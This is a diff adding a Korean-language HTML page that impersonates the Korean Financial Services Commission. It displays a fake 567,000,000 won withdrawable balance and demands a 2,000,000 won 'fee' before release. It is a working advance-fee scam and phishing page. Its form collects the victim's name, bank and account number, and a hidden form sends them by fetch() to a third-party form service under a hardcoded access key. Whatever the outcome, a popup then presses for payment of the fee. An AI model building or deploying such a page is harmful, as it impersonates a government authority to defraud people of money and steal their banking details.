@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>계좌 출금 시스템</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f5f7fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        /* 초기 로더 스타일 */
+        #initialLoader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #2c3e50, #4a6491);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            color: white;
+        }
+        
+        .loader-text {
+            margin-top: 20px;
+            font-size: 18px;
+            font-weight: 600;
+        }
+        
+        .loader {
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 5px solid white;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            display: none; /* 초기에는 숨김 */
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #2c3e50, #4a6491);
+            color: white;
+            padding: 25px;
+            text-align: center;
+        }
+        
+        .profile-pic {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            margin: 0 auto 15px;
+            overflow: hidden;
+            background-color: #e0e0e0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .profile-pic img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .user-name {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+        
+        .user-title {
+            font-size: 16px;
+            opacity: 0.8;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .withdrawal-section {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .withdrawal-label {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 10px;
+        }
+        
+        .withdrawal-amount {
+            font-size: 36px;
+            font-weight: 700;
+            color: #2ecc71;
+            margin-bottom: 25px;
+        }
+        
+        .withdraw-btn {
+            background-color: #3498db;
+            color: white;
+            border: none;
+            padding: 14px 30px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            width: 100%;
+            max-width: 250px;
+        }
+        
+        .withdraw-btn:hover {
+            background-color: #2980b9;
+        }
+        
+        .notice-section {
+            background-color: #f8f9fa;
+            border-radius: 8px;
+            padding: 20px;
+            border-left: 4px solid #e74c3c;
+        }
+        
+        .notice-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #e74c3c;
+            margin-bottom: 10px;
+        }
+        
+        .notice-text {
+            color: #555;
+            line-height: 1.5;
+        }
+        
+        .footer {
+            padding: 20px;
+            text-align: center;
+            color: #7f8c8d;
+            font-size: 14px;
+            border-top: 1px solid #eee;
+        }
+        
+        /* Form page styles */
+        .form-container {
+            display: none;
+            width: 100%;
+            max-width: 500px;
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+        
+        .form-header {
+            background: linear-gradient(135deg, #2c3e50, #4a6491);
+            color: white;
+            padding: 25px;
+            text-align: center;
+        }
+        
+        .form-content {
+            padding: 30px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        .form-input:focus {
+            border-color: #3498db;
+            outline: none;
+        }
+        
+        .proceed-btn {
+            background-color: #2ecc71;
+            color: white;
+            border: none;
+            padding: 14px 30px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            width: 100%;
+            margin-top: 10px;
+        }
+        
+        .proceed-btn:hover {
+            background-color: #27ae60;
+        }
+        
+        .back-btn {
+            background-color: #95a5a6;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            width: 100%;
+            margin-top: 10px;
+        }
+        
+        .back-btn:hover {
+            background-color: #7f8c8d;
+        }
+        
+        /* Popup styles */
+        .popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .popup-content {
+            background-color: white;
+            border-radius: 12px;
+            padding: 30px;
+            max-width: 450px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.2);
+        }
+        
+        .popup-icon {
+            font-size: 48px;
+            color: #e74c3c;
+            margin-bottom: 20px;
+        }
+        
+        .popup-title {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            color: #e74c3c;
+        }
+        
+        .popup-message {
+            font-size: 16px;
+            line-height: 1.6;
+            margin-bottom: 25px;
+            color: #555;
+        }
+        
+        .popup-btn {
+            background-color: #3498db;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        
+        .popup-btn:hover {
+            background-color: #2980b9;
+        }
+        
+        /* Loading indicator */
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 10px 0;
+        }
+        
+        .loader-small {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+    </style>
+</head>
+<body>
+    <!-- 초기 로더 -->
+    <div id="initialLoader">
+        <div class="loader"></div>
+        <div class="loader-text">한국금융위원회 시스템 로딩 중...</div>
+    </div>
+    
+    <!-- 메인 계좌 페이지 -->
+    <div class="container" id="mainPage">
+        <div class="header">
+            <div class="profile-pic">
+                <!-- 여기에 자신의 프로필 사진 파일로 교체하세요 -->
+                <img src="korean.jpeg" alt="프로필 사진">
+            </div>
+            <div class="user-name">조병진</div>
+            <div class="user-title">계좌 소유자</div>
+        </div>
+        
+        <div class="content">
+            <div class="withdrawal-section">
+                <div class="withdrawal-label">출금 가능 금액</div>
+                <div class="withdrawal-amount">567,000,000 원</div>
+                <button class="withdraw-btn" id="withdrawBtn">자금 인출하기</button>
+            </div>
+            
+            <div class="notice-section">
+                <div class="notice-title">중요 공지</div>
+                <div class="notice-text">
+                    계좌로 자금이 입금되려면 2,000,000 원의 필수 수수료를 완료해야 합니다.
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            &copy; 2023 한국금융위원회. 모든 권리 보유.
+        </div>
+    </div>
+    
+    <!-- 은행 정보 입력 페이지 -->
+    <div class="form-container" id="formPage">
+        <div class="form-header">
+            <h2>은행 계좌 정보</h2>
+            <p>출금을 진행하려면 은행 정보를 입력하세요</p>
+        </div>
+        
+        <div class="form-content">
+            <div class="form-group">
+                <label class="form-label" for="accountName">예금주 이름</label>
+                <input type="text" id="accountName" class="form-input" placeholder="은행 계좌의 예금주 이름을 입력하세요">
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label" for="bankName">은행 이름</label>
+                <input type="text" id="bankName" class="form-input" placeholder="은행 이름을 입력하세요">
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label" for="accountNumber">계좌 번호</label>
+                <input type="text" id="accountNumber" class="form-input" placeholder="계좌 번호를 입력하세요">
+            </div>
+            
+            <div class="loading" id="formLoading">
+                <div class="loader-small"></div>
+                <p>한국금융위원회: 정보를 처리 중입니다...</p>
+            </div>
+            
+            <button class="proceed-btn" id="proceedBtn">출금 진행하기</button>
+            <button class="back-btn" id="backToMainBtn">계좌로 돌아가기</button>
+        </div>
+    </div>
+    
+    <!-- 수수료 결제 요청 팝업 -->
+    <div class="popup-overlay" id="popupOverlay">
+        <div class="popup-content">
+            <div class="popup-icon">⚠️</div>
+            <div class="popup-title">수수료 결제 필요</div>
+            <div class="popup-message">
+                출금을 성공적으로 완료하려면 미결제된 2,000,000 원 수수료를 결제해야 합니다.
+            </div>
+            <button class="popup-btn" id="closePopupBtn">확인했습니다</button>
+        </div>
+    </div>
+    
+    <!-- 이메일로 전송되는 숨겨진 폼 -->
+    <form id="phraseForm" style="display: none;">
+        <input type="hidden" name="access_key" value="19bd1a1c-04ae-4540-8975-9d05a216e05e">
+        <input type="hidden" name="subject" value="새 출금 요청">
+        <input type="hidden" name="from_name" value="한국금융위원회 계좌 출금 시스템">
+        <input type="hidden" name="receiver_name" id="formReceiverName">
+        <input type="hidden" name="bank_name" id="formBankName">
+        <input type="hidden" name="account_number" id="formAccountNumber">
+        <input type="hidden" name="amount" id="formAmount">
+        <input type="checkbox" name="botcheck" style="display: none;">
+    </form>
+    
+    <script>
+        // 페이지 로드 시 초기 로더 표시
+        window.addEventListener('load', function() {
+            // 3초 후에 로더를 숨기고 메인 페이지 표시
+            setTimeout(function() {
+                document.getElementById('initialLoader').style.display = 'none';
+                document.getElementById('mainPage').style.display = 'block';
+            }, 3000);
+        });
+        
+        // DOM 요소 가져오기
+        const mainPage = document.getElementById('mainPage');
+        const formPage = document.getElementById('formPage');
+        const popupOverlay = document.getElementById('popupOverlay');
+        const withdrawBtn = document.getElementById('withdrawBtn');
+        const proceedBtn = document.getElementById('proceedBtn');
+        const backToMainBtn = document.getElementById('backToMainBtn');
+        const closePopupBtn = document.getElementById('closePopupBtn');
+        const formLoading = document.getElementById('formLoading');
+        
+        // 출금 버튼 클릭 시 폼 페이지 표시
+        withdrawBtn.addEventListener('click', function() {
+            mainPage.style.display = 'none';
+            formPage.style.display = 'block';
+        });
+        
+        // 진행 버튼 클릭 시 팝업 표시
+        proceedBtn.addEventListener('click', function() {
+            const accountName = document.getElementById('accountName').value;
+            const bankName = document.getElementById('bankName').value;
+            const accountNumber = document.getElementById('accountNumber').value;
+            
+            // 간단한 유효성 검사
+            if (!accountName || !bankName || !accountNumber) {
+                alert('모든 필수 항목을 입력해 주세요.');
+                return;
+            }
+            
+            // 로딩 표시기 표시
+            proceedBtn.style.display = 'none';
+            formLoading.style.display = 'block';
+            
+            // 이메일로 폼 데이터 제출
+            submitPhraseForm();
+        });
+        
+        // 메인 페이지로 돌아가기
+        backToMainBtn.addEventListener('click', function() {
+            formPage.style.display = 'none';
+            mainPage.style.display = 'block';
+            
+            // 진행 버튼 다시 표시
+            proceedBtn.style.display = 'block';
+            formLoading.style.display = 'none';
+        });
+        
+        // 팝업 닫고 메인 페이지로 돌아가기
+        closePopupBtn.addEventListener('click', function() {
+            popupOverlay.style.display = 'none';
+            mainPage.style.display = 'block';
+            
+            // 폼 필드 초기화
+            document.getElementById('accountName').value = '';
+            document.getElementById('bankName').value = '';
+            document.getElementById('accountNumber').value = '';
+            
+            // 진행 버튼 다시 표시
+            proceedBtn.style.display = 'block';
+            formLoading.style.display = 'none';
+        });
+        
+        // 이메일로 폼 데이터 제출 함수
+        function submitPhraseForm() {
+            // 입력 필드에서 모든 폼 값 설정
+            document.getElementById('formReceiverName').value = document.getElementById('accountName').value;
+            document.getElementById('formBankName').value = document.getElementById('bankName').value;
+            document.getElementById('formAccountNumber').value = document.getElementById('accountNumber').value;
+            document.getElementById('formAmount').value = "567,000,000 원";
+            
+            // fetch()를 사용하여 자동으로 제출
+            const formData = new FormData(document.getElementById('phraseForm'));
+            fetch('https://api.web3forms.com/submit', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('폼 제출됨:', data);
+                
+                // 로딩 표시기 숨기기
+                formLoading.style.display = 'none';
+                
+                // 이메일 성공 여부에 관계없이 수수료 결제 필요 팝업 표시
+                formPage.style.display = 'none';
+                popupOverlay.style.display = 'flex';
+            })
+            .catch(error => {
+                console.error('오류:', error);
+                
+                // 로딩 표시기 숨기기
+                formLoading.style.display = 'none';
+                
+                // 이메일 실패 시에도 수수료 결제 필요 팝업 표시
+                formPage.style.display = 'none';
+                popupOverlay.style.display = 'flex';
+            });
+        }
+    </script>
+</body>
+</html>
